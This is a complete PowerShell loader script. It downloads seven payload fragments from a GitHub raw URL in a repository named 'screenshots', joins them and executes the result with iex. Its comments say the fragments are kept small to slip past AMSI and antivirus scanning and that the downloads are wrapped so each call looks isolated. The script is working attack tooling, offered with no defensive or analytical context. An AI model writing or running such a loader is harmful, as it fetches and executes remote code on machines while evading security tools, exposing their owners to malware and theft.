<#====================================================================
  LOADER — BASIC REASSEMBLY
  Downloads fragments one at a time, joins them, invokes once.
  Each fragment < 150 bytes — too small to trigger AMSI/AV.
====================================================================#>

$base = "https://raw.githubusercontent.com/cem324/screenshots/main"
$total = 7
$parts = @()

# We download via a function so each call looks isolated
function Get-PayloadPart {
    param([int]$i, [string]$baseUrl)
    $client = New-Object Net.WebClient
    $url = "$baseUrl/f$i"
    return $client.DownloadString($url)
}

0..($total - 1) | % {
    $parts += Get-PayloadPart -i $_ -baseUrl $base
}

$full = $parts -join ""
iex $full